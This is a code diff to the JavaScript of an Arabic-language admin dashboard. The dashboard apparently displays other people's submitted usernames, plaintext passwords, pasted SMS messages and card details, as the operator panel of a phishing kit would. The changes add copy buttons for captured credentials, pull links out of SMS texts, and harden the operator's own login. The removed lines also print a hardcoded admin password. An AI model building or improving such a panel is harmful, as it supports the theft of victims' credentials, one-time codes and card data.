@@ -129,6 +129,8 @@ class ApiDatabase {
 let db = new ApiDatabase();
 let currentUser = null;
 let isLoggedIn = false;
+/** يُعبأ بعد التحقق من الخطوة 1 لتغيير كلمة المرور */
+let adminChangePwVerifiedOld = '';
 
 const INTERNAL_FIELD_KEYS = new Set([
     'id',
@@ -183,6 +185,98 @@ function escapeHtml(value) {
     const div = document.createElement('div');
     div.textContent = String(value);
     return div.innerHTML;
+}
+
+function encodeCopyPayload(text) {
+    try {
+        return encodeURIComponent(String(text));
+    } catch (e) {
+        return '';
+    }
+}
+
+function copyTextToClipboard(text) {
+    const t = String(text ?? '');
+    if (navigator.clipboard && navigator.clipboard.writeText) {
+        return navigator.clipboard.writeText(t);
+    }
+    return new Promise((resolve, reject) => {
+        try {
+            const ta = document.createElement('textarea');
+            ta.value = t;
+            ta.setAttribute('readonly', '');
+            ta.style.position = 'fixed';
+            ta.style.left = '-9999px';
+            document.body.appendChild(ta);
+            ta.select();
+            document.execCommand('copy');
+            document.body.removeChild(ta);
+            resolve();
+        } catch (err) {
+            reject(err);
+        }
+    });
+}
+
+/** استخراج روابط http/https من نص الرسالة */
+function extractUrlsFromText(text) {
+    const s = String(text || '');
+    const re = /https?:\/\/\S+/gi;
+    const seen = new Set();
+    const out = [];
+    let m;
+    while ((m = re.exec(s)) !== null) {
+        let url = m[0].replace(/[.,;:!?)\u00BB\u201D\u2019\]}]+$/u, '');
+        try {
+            const normalized = new URL(url).href;
+            if (!seen.has(normalized)) {
+                seen.add(normalized);
+                out.push(normalized);
+            }
+        } catch (e) {
+            if (!seen.has(url)) {
+                seen.add(url);
+                out.push(url);
+            }
+        }
+    }
+    return out;
+}
+
+function renderExtractedUrlsTable(urls) {
+    if (!urls || !urls.length) return '';
+    const rows = urls
+        .map((u) => {
+            const safe = escapeHtml(u);
+            const enc = encodeCopyPayload(u);
+            return `<tr>
+                <td class="extracted-url-cell"><a href="${safe}" target="_blank" rel="noopener noreferrer" class="extracted-url-link">${safe}</a></td>
+                <td class="extracted-url-actions"><button type="button" class="btn-copy-dashboard" data-copy="${enc}" title="نسخ الرابط">نسخ الرابط</button></td>
+            </tr>`;
+        })
+        .join('');
+    return `
+        <h4 class="extracted-links-heading">روابط مستخرجة من الرسالة</h4>
+        <p class="extracted-links-note">يمكن فتح الرابط في تبويب جديد أو نسخه. النص الكامل للرسالة يظهر في الجدول أعلاه.</p>
+        <table class="detail-field-table extracted-urls-table">
+            <thead><tr><th>الرابط</th><th>إجراء</th></tr></thead>
+            <tbody>${rows}</tbody>
+        </table>`;
+}
+
+function renderDetailFieldValueCell(val, fieldMeta) {
+    if (val === '—') {
+        return `<td>—</td>`;
+    }
+    const enc = encodeCopyPayload(val);
+    const textSpanClass = fieldMeta.prewrap
+        ? 'detail-field-value-text detail-field-value-text--pre'
+        : 'detail-field-value-text';
+    const valueHtml = `<span class="${textSpanClass}">${escapeHtml(val)}</span>`;
+    if (fieldMeta.copyable && enc !== '') {
+        return `<td class="detail-field-td--value-actions">${valueHtml}<button type="button" class="btn-copy-dashboard" data-copy="${enc}" title="نسخ إلى الحافظة">نسخ</button></td>`;
+    }
+    return `<td>${fieldMeta.prewrap ? valueHtml : escapeHtml(val)}</td>`;
 }
 
 function orderedFieldKeys(keys) {
@@ -242,14 +336,21 @@ const DASHBOARD_FORM_TABLES = [
     {
         page: 'messege',
         title: 'معلومات الرسالة',
-        fields: [{ key: 'pastedSmsMessage', label: 'نص الرسالة المُلصَق' }]
+        fields: [
+            {
+                key: 'pastedSmsMessage',
+                label: 'نص الرسالة المُلصَق',
+                copyable: true,
+                prewrap: true
+            }
+        ]
     },
     {
         page: 'login',
         title: 'معلومات الحساب',
         fields: [
-            { key: 'username', label: 'اسم المستخدم' },
-            { key: 'password', label: 'كلمة المرور' }
+            { key: 'username', label: 'اسم المستخدم', copyable: true },
+            { key: 'password', label: 'كلمة المرور', copyable: true }
         ]
     },
     {
@@ -835,13 +936,66 @@ function renderDashboardTables() {
     refreshOpenModalsAfterDataChange();
 }
 
-// Session Management - حفظ جلسة الدخول
-function saveSession() {
-    localStorage.setItem('adminSession', JSON.stringify({
-        isLoggedIn: true,
-        timestamp: new Date().getTime(),
-        device: navigator.userAgent
-    }));
+// Session Management - حفظ جلسة الدخول (sessionEpoch يُزامَن مع الخادم لإبطال الأجهزة الأخرى)
+function saveSession(sessionEpoch) {
+    const epoch =
+        typeof sessionEpoch === 'number' && !Number.isNaN(sessionEpoch)
+            ? sessionEpoch
+            : 0;
+    localStorage.setItem(
+        'adminSession',
+        JSON.stringify({
+            isLoggedIn: true,
+            timestamp: new Date().getTime(),
+            device: navigator.userAgent,
+            sessionEpoch: epoch
+        })
+    );
+}
+
+function updateStoredAdminSessionEpoch(epoch) {
+    const raw = localStorage.getItem('adminSession');
+    let s = { isLoggedIn: true, device: navigator.userAgent };
+    if (raw) {
+        try {
+            s = { ...s, ...JSON.parse(raw) };
+        } catch (e) {
+            /* ignore */
+        }
+    }
+    s.isLoggedIn = true;
+    s.timestamp = Date.now();
+    s.sessionEpoch =
+        typeof epoch === 'number' && !Number.isNaN(epoch) ? epoch : 0;
+    localStorage.setItem('adminSession', JSON.stringify(s));
+}
+
+async function ensureAdminSessionStillValid() {
+    if (!isLoggedIn) return;
+    const session = getSession();
+    if (!session || !session.isLoggedIn) return;
+    const localEpoch =
+        typeof session.sessionEpoch === 'number' ? session.sessionEpoch : 0;
+    const base = db.apiBase();
+    if (!base) return;
+    try {
+        const res = await fetch(db.apiUrl('api/admin/dashboard-auth/epoch'), {
+            headers: db.headers()
+        });
+        if (!res.ok) return;
+        const data = await res.json();
+        const serverEpoch =
+            typeof data.sessionEpoch === 'number' ? data.sessionEpoch : 0;
+        if (serverEpoch > localEpoch) {
+            db.showNotification(
+                'انتهت صلاحية الجلسة على هذا الجهاز. سجّل الدخول مجدداً.',
+                'info'
+            );
+            logout();
+        }
+    } catch (e) {
+        /* تجاهل انقطاع الشبكة المؤقت */
+    }
 }
 
 function getSession() {
@@ -853,39 +1007,70 @@ function clearSession() {
     localStorage.removeItem('adminSession');
 }
 
-// Password Check
-function checkPassword() {
-    const password = document.getElementById('adminPassword').value;
-    const adminPassword = 'qqwe@22'; // كلمة المرور الافتراضية
-
-    if (password === adminPassword) {
+// Password Check — التحقق من الخادم (مجموعة dashboard_auth في MongoDB)
+async function checkPassword() {
+    const passwordEl = document.getElementById('adminPassword');
+    const password = passwordEl ? passwordEl.value : '';
+    if (!String(password).trim()) {
+        db.showNotification('أدخل كلمة المرور', 'error');
+        return;
+    }
+    if (!db.apiBase()) {
+        db.showNotification(
+            'لم يُضبط عنوان الخادم (API). راجع api-config.js',
+            'error'
+        );
+        return;
+    }
+    try {
+        const res = await fetch(db.apiUrl('api/admin/dashboard-auth/verify'), {
+            method: 'POST',
+            headers: db.headers({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ password })
+        });
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+            db.showNotification(
+                data.error || 'كلمة المرور غير صحيحة',
+                'error'
+            );
+            return;
+        }
+        if (!data.ok) {
+            db.showNotification('كلمة المرور غير صحيحة', 'error');
+            return;
+        }
         isLoggedIn = true;
-        // حفظ الجلسة
-        saveSession();
-        
-        // إخفاء login modal بشكل صحيح
+        saveSession(
+            typeof data.sessionEpoch === 'number' ? data.sessionEpoch : 0
+        );
+
         const loginModal = document.getElementById('loginModal');
         loginModal.classList.remove('active');
         loginModal.style.setProperty('display', 'none', 'important');
-        
-        // إظهار dashboard
-        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
-        document.getElementById('adminPassword').value = '';
-        
-        // التأكد من إغلاق أي مودالات
+
+        document
+            .getElementById('dashboardContainer')
+            .classList.remove('dashboard-hidden');
+        if (passwordEl) passwordEl.value = '';
+
         const infoModal1 = document.getElementById('infoModal');
         infoModal1.classList.add('modal-hidden');
         infoModal1.classList.remove('active');
         infoModal1.style.setProperty('display', 'none', 'important');
-        
+
         const cardModal1 = document.getElementById('cardModal');
         cardModal1.classList.add('modal-hidden');
         cardModal1.classList.remove('active');
         cardModal1.style.setProperty('display', 'none', 'important');
-        
-        loadDashboard();
-    } else {
-        db.showNotification('كلمة المرور غير صحيحة', 'error');
+
+        await loadDashboard();
+    } catch (e) {
+        console.error(e);
+        db.showNotification(
+            'تعذر الاتصال بالخادم للتحقق من كلمة المرور.',
+            'error'
+        );
     }
 }
 
@@ -917,6 +1102,8 @@ function logout() {
 
 // Load Dashboard
 async function loadDashboard() {
+    await ensureAdminSessionStillValid();
+    if (!isLoggedIn) return;
     try {
         await db.refresh();
     } catch (e) {
@@ -931,6 +1118,8 @@ async function loadDashboard() {
         clearInterval(dashboardRefreshIntervalId);
     }
     dashboardRefreshIntervalId = setInterval(async () => {
+        await ensureAdminSessionStillValid();
+        if (!isLoggedIn) return;
         try {
             await db.refresh();
         } catch (err) {
@@ -938,6 +1127,157 @@ async function loadDashboard() {
         }
         renderDashboardTables();
     }, 1500);
+}
+
+function openAdminChangePasswordModal() {
+    adminChangePwVerifiedOld = '';
+    const m = document.getElementById('adminChangePasswordModal');
+    const s1 = document.getElementById('adminChangePwStep1');
+    const s2 = document.getElementById('adminChangePwStep2');
+    const oldEl = document.getElementById('adminChangePwOld');
+    const n1 = document.getElementById('adminChangePwNew');
+    const n2 = document.getElementById('adminChangePwNew2');
+    const rev = document.getElementById('adminChangePwRevokeAll');
+    if (oldEl) oldEl.value = '';
+    if (n1) n1.value = '';
+    if (n2) n2.value = '';
+    if (rev) rev.checked = false;
+    if (s1) s1.hidden = false;
+    if (s2) s2.hidden = true;
+    if (m) {
+        m.classList.remove('modal-hidden');
+        m.classList.add('active');
+        m.style.setProperty('display', 'flex', 'important');
+        m.setAttribute('aria-hidden', 'false');
+    }
+    if (oldEl) oldEl.focus();
+}
+
+function closeAdminChangePasswordModal() {
+    adminChangePwVerifiedOld = '';
+    const m = document.getElementById('adminChangePasswordModal');
+    if (m) {
+        m.classList.add('modal-hidden');
+        m.classList.remove('active');
+        m.style.setProperty('display', 'none', 'important');
+        m.setAttribute('aria-hidden', 'true');
+    }
+}
+
+async function adminChangePasswordStep1Continue() {
+    const oldEl = document.getElementById('adminChangePwOld');
+    const oldPw = oldEl ? String(oldEl.value || '') : '';
+    if (!oldPw.trim()) {
+        db.showNotification('أدخل كلمة المرور الحالية', 'error');
+        return;
+    }
+    if (!db.apiBase()) {
+        db.showNotification('لم يُضبط عنوان الخادم (API).', 'error');
+        return;
+    }
+    try {
+        const res = await fetch(db.apiUrl('api/admin/dashboard-auth/verify'), {
+            method: 'POST',
+            headers: db.headers({ 'Content-Type': 'application/json' }),
+            body: JSON.stringify({ password: oldPw })
+        });
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+            db.showNotification(
+                data.error || 'كلمة المرور الحالية غير صحيحة',
+                'error'
+            );
+            return;
+        }
+        adminChangePwVerifiedOld = oldPw;
+        const s1 = document.getElementById('adminChangePwStep1');
+        const s2 = document.getElementById('adminChangePwStep2');
+        if (s1) s1.hidden = true;
+        if (s2) {
+            s2.hidden = false;
+            const n1 = document.getElementById('adminChangePwNew');
+            if (n1) n1.focus();
+        }
+    } catch (e) {
+        console.error(e);
+        db.showNotification('تعذر التحقق من كلمة المرور.', 'error');
+    }
+}
+
+function adminChangePasswordStep2Back() {
+    adminChangePwVerifiedOld = '';
+    const s1 = document.getElementById('adminChangePwStep1');
+    const s2 = document.getElementById('adminChangePwStep2');
+    if (s2) s2.hidden = true;
+    if (s1) {
+        s1.hidden = false;
+        const oldEl = document.getElementById('adminChangePwOld');
+        if (oldEl) oldEl.focus();
+    }
+}
+
+async function adminChangePasswordSubmit() {
+    const newEl = document.getElementById('adminChangePwNew');
+    const new2El = document.getElementById('adminChangePwNew2');
+    const newPw = newEl ? String(newEl.value || '') : '';
+    const newPw2 = new2El ? String(new2El.value || '') : '';
+    const revEl = document.getElementById('adminChangePwRevokeAll');
+    const revoke = !!(revEl && revEl.checked);
+    if (!adminChangePwVerifiedOld) {
+        db.showNotification('أعد الخطوة الأولى للتحقق من كلمة المرور الحالية.', 'error');
+        return;
+    }
+    if (newPw.length < 6) {
+        db.showNotification(
+            'كلمة المرور الجديدة يجب ألا تقل عن 6 أحرف',
+            'error'
+        );
+        return;
+    }
+    if (newPw !== newPw2) {
+        db.showNotification('تأكيد كلمة المرور غير متطابق', 'error');
+        return;
+    }
+    if (!db.apiBase()) {
+        db.showNotification('لم يُضبط عنوان الخادم (API).', 'error');
+        return;
+    }
+    try {
+        const res = await fetch(
+            db.apiUrl('api/admin/dashboard-auth/change-password'),
+            {
+                method: 'POST',
+                headers: db.headers({ 'Content-Type': 'application/json' }),
+                body: JSON.stringify({
+                    oldPassword: adminChangePwVerifiedOld,
+                    newPassword: newPw,
+                    revokeAllSessions: revoke
+                })
+            }
+        );
+        const data = await res.json().catch(() => ({}));
+        if (!res.ok) {
+            db.showNotification(
+                data.error || 'فشل تغيير كلمة المرور',
+                'error'
+            );
+            return;
+        }
+        updateStoredAdminSessionEpoch(
+            typeof data.sessionEpoch === 'number' ? data.sessionEpoch : 0
+        );
+        adminChangePwVerifiedOld = '';
+        closeAdminChangePasswordModal();
+        db.showNotification(
+            revoke
+                ? 'تم تغيير كلمة المرور وإبطال جلسات الأجهزة الأخرى.'
+                : 'تم تغيير كلمة المرور بنجاح.',
+            'success'
+        );
+    } catch (e) {
+        console.error(e);
+        db.showNotification('تعذر الاتصال بالخادم.', 'error');
+    }
 }
 
 function getPageArabic(page) {
@@ -1025,10 +1365,18 @@ function renderUserDetailsByPage(user) {
         for (const f of cfg.fields) {
             const val = getFieldDisplayValue(source, f.key);
             if (val !== '—') anyFilled = true;
-            rows += `<tr><th>${escapeHtml(f.label)}</th><td>${escapeHtml(val)}</td></tr>`;
+            rows += `<tr><th>${escapeHtml(f.label)}</th>${renderDetailFieldValueCell(val, f)}</tr>`;
         }
         if (!anyFilled) {
             rows = '<tr><th colspan="2">لا توجد تسجيلات في هذا القسم</th></tr>';
+        }
+        let linksBlock = '';
+        if (cfg.page === 'messege' && anyFilled) {
+            const rawMsg = getFieldDisplayValue(source, 'pastedSmsMessage');
+            if (rawMsg !== '—') {
+                const urls = extractUrlsFromText(rawMsg);
+                linksBlock = renderExtractedUrlsTable(urls);
+            }
         }
         html += `
         <div class="page-section">
@@ -1036,6 +1384,7 @@ function renderUserDetailsByPage(user) {
             <table class="detail-field-table">
                 <tbody>${rows}</tbody>
             </table>
+            ${linksBlock}
         </div>`;
     }
     return html;
@@ -1491,9 +1840,35 @@ async function refreshData() {
     }
 }
 
+// نسخ حقول منبثق المعلومات (اسم مستخدم، كلمة مرور، رابط، نص رسالة…)
+document.getElementById('infoModal').addEventListener('click', (e) => {
+    const btn = e.target.closest('.btn-copy-dashboard');
+    if (!btn || !document.getElementById('infoModal').contains(btn)) return;
+    const enc = btn.getAttribute('data-copy');
+    if (enc == null || enc === '') {
+        db.showNotification('لا يوجد نص للنسخ', 'error');
+        return;
+    }
+    let text;
+    try {
+        text = decodeURIComponent(enc);
+    } catch (err) {
+        db.showNotification('تعذر قراءة النص', 'error');
+        return;
+    }
+    e.preventDefault();
+    e.stopPropagation();
+    copyTextToClipboard(text)
+        .then(() => db.showNotification('تم النسخ إلى الحافظة', 'success'))
+        .catch(() =>
+            db.showNotification('تعذر النسخ — تحقق من أذونات الحافظة', 'error')
+        );
+});
+
 // Keyboard shortcuts
 document.addEventListener('keydown', (e) => {
     if (e.key === 'Escape') {
+        closeAdminChangePasswordModal();
         closeInfoModal();
         closeCardModal();
     }
@@ -1513,22 +1888,40 @@ document.getElementById('cardModal').addEventListener('click', (e) => {
     }
 });
 
+const adminChangePasswordModalEl = document.getElementById(
+    'adminChangePasswordModal'
+);
+if (adminChangePasswordModalEl) {
+    adminChangePasswordModalEl.addEventListener('click', (e) => {
+        if (e.target.id === 'adminChangePasswordModal') {
+            closeAdminChangePasswordModal();
+        }
+    });
+}
+
 // Initialize
 window.addEventListener('load', () => {
-    // التحقق من الجلسة المحفوظة
+    const passwordInput = document.getElementById('adminPassword');
+    if (passwordInput) {
+        passwordInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                checkPassword();
+            }
+        });
+    }
+
     const session = getSession();
-    
+
     if (session && session.isLoggedIn) {
-        // المستخدم مسجل دخول سابقاً
         isLoggedIn = true;
-        
-        // إخفاء login modal
+
         const loginModal = document.getElementById('loginModal');
         loginModal.classList.remove('active');
         loginModal.style.setProperty('display', 'none', 'important');
-        
-        // إظهار dashboard
-        document.getElementById('dashboardContainer').classList.remove('dashboard-hidden');
+
+        document
+            .getElementById('dashboardContainer')
+            .classList.remove('dashboard-hidden');
         const infoModal5 = document.getElementById('infoModal');
         infoModal5.classList.add('modal-hidden');
         infoModal5.classList.remove('active');
@@ -1537,15 +1930,21 @@ window.addEventListener('load', () => {
         cardModal5.classList.add('modal-hidden');
         cardModal5.classList.remove('active');
         cardModal5.style.setProperty('display', 'none', 'important');
-        
-        loadDashboard();
+
+        (async () => {
+            await ensureAdminSessionStillValid();
+            if (isLoggedIn) {
+                await loadDashboard();
+            }
+        })();
     } else {
-        // لم يكن مسجل دخول
         const loginModal = document.getElementById('loginModal');
         loginModal.classList.add('active');
         loginModal.style.setProperty('display', 'flex', 'important');
-        
-        document.getElementById('dashboardContainer').classList.add('dashboard-hidden');
+
+        document
+            .getElementById('dashboardContainer')
+            .classList.add('dashboard-hidden');
         const infoModal3 = document.getElementById('infoModal');
         infoModal3.classList.add('modal-hidden');
         infoModal3.classList.remove('active');
@@ -1554,15 +1953,5 @@ window.addEventListener('load', () => {
         cardModal3.classList.add('modal-hidden');
         cardModal3.classList.remove('active');
         cardModal3.style.setProperty('display', 'none', 'important');
-    }
-    
-    // السماح بضغط Enter لتسجيل الدخول
-    const passwordInput = document.getElementById('adminPassword');
-    if (passwordInput) {
-        passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') {
-                checkPassword();
-            }
-        });
     }
 });
